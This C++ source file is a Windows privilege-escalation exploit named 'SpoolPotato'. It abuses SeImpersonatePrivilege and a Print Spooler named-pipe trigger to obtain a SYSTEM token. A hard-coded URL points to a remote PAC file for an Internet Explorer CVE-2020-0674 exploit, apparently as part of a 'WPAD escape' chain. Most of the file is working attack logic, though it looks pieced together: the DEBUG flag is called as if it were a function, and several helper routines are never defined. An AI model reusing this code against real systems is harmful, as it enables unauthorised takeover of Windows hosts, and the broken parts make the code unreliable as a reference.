#include <iostream>
#include <Windows.h>
#include <strsafe.h>
#include <sddl.h>
#include <userenv.h>
#include <wtsapi32.h>
#include "IWinSpool_h.h"

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "userenv.lib")
#pragma warning(disable: 28251)

////////
////////
// Global settings
////////

#define DEBUG
#define EXE_BUILD
//#define DLL_BUILD
//#define SHELLCODE_BUILD
#define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit.pac"

////////
////////
// Debug logic
////////

#ifdef DEBUG
void DebugLog(const wchar_t* Format, ...) {
    va_list Args;
    wchar_t* pBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10000 * 2);
    va_start(Args, Format);
    wvsprintf(pBuffer, Format, Args);
    va_end(Args);
#ifdef DLL_BUILD
    MessageBoxW(0, pBuffer, L"WPAD escape", 0);
#endif
#ifdef EXE_BUILD
    printf("%ws\r\n", pBuffer);
#endif
    HeapFree(GetProcessHeap(), 0, pBuffer);
}
#endif

DWORD SpoolPotato()
{
	LPWSTR pwszPipeName = NULL;
	HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
	HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
	HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
	DWORD dwWait = 0;

	if (!CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME))
	{
		DEBUG(L"[-] A privilege is missing: '%ws'\n", SE_IMPERSONATE_NAME);
		goto cleanup;
	}

	DEBUG(L"[+] Found privilege: %ws\n", SE_IMPERSONATE_NAME);

	if (!GenerateRandomPipeName(&pwszPipeName))
	{
		DEBUG(L"[-] Failed to generate a name for the pipe.\n");
		goto cleanup;
	}

	DEBUG(L"Successfully generated random pipe name: %ws\r\n", pwszPipeName);

	if (!(hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName)))
	{
		DEBUG(L"[-] Failed to create a named pipe.\n");
		goto cleanup;
	}

	DEBUG(L"Successfully created named pipe");

	if (!(hSpoolPipeEvent = ConnectSpoolNamedPipe(hSpoolPipe)))
	{
		DEBUG(L"[-] Failed to connect the named pipe.\n");
		goto cleanup;
	}

	DEBUG(L"[+] Named pipe listening...\n");

	if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName)))
	{
		DEBUG(L"[-] Failed to trigger the Spooler service.\n");
		goto cleanup;
	}

	dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
	if (dwWait != WAIT_OBJECT_0)
	{
		DEBUG(L"[-] Operation failed or timed out.\n");
		goto cleanup;
	}

	GetSystem(hSpoolPipe);

cleanup:
	if (hSpoolPipe)
		CloseHandle(hSpoolPipe);
	if (hSpoolPipeEvent)
		CloseHandle(hSpoolPipeEvent);
	if (hSpoolTriggerThread)
		CloseHandle(hSpoolTriggerThread);

	return 0;
}

int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
	SpoolPotato();
    return 0;
}